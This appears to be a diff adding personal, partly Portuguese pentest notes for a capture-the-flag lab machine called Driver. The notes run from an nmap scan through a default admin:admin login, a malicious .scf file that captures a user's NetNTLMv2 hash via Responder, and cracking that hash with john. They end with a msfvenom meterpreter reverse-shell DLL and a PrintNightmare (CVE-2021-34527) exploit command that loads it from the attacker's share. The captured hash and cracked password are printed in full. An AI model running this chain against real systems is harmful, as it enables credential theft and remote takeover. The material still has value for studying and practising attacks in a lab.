@@ -1,0 +1,77 @@
+10.10.11.106
+
+nmap -sC -sV  10.10.11.106  -Pn -p-
+
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-02 16:07 EDT
+Nmap scan report for 10.10.11.106
+Host is up (0.12s latency).
+Not shown: 65531 filtered ports
+PORT     STATE SERVICE      VERSION
+80/tcp   open  http         Microsoft IIS httpd 10.0
+| http-auth: 
+| HTTP/1.1 401 Unauthorized\x0D
+|_  Basic realm=MFP Firmware Update Center. Please enter password for admin
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
+135/tcp  open  msrpc        Microsoft Windows RPC
+445/tcp  open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
+5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+Service Info: Host: DRIVER; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: 7h01m05s, deviation: 0s, median: 7h01m05s
+| smb-security-mode: 
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2021-10-03T03:13:45
+|_  start_date: 2021-10-03T02:44:59
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 322.11 seconds
+
+
+http://10.10.11.106
+
+admin:admin
+
+criar um arquivo .scf
+[shell]
+Command=2
+IconFile=\\10.10.14.111\share\pentestlab.ico
+[Taskbar]
+Command=ToggleDesktop
+
+Usar o responder 
+
+sudo responder -I tun0 wrf
+
+
+tony::DRIVER:ab9dc211939bbdd9:6804620DBC3C7A07A676351CCB46ABB2:010100000000000000B43A946BBFD701DF0DDC6C4AC41A2A0000000002000800570042003800470001001E00570049004E002D004E00330050004100390046004B00350046003300480004003400570049004E002D004E00330050004100390046004B0035004600330048002E0057004200380047002E004C004F00430041004C000300140057004200380047002E004C004F00430041004C000500140057004200380047002E004C004F00430041004C000700080000B43A946BBFD70106000400020000000800300030000000000000000000000000200000BFF425C9A280981E2880197D296100A4F3E3F6FBCD87D83E08C80645DF3967490A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E00310031003100000000000000000000000000  
+
+
+john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt 
+
+liltony          (tony)
+
+configurar smb e outras coisas como o payload 
+
+https://www.youtube.com/watch?v=lLnp4TzuKGU&ab_channel=SolydOffensiveSecurity
+
+https://github.com/cube0x0/CVE-2021-1675
+
+
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.42 LPORT=4444 -f dll -o glrn.dll
+
+
+python3 CVE-2021-34527.py driver.htb/tony:liltony@10.10.11.106 '\\10.10.14.42\open\glrn.dll'
+
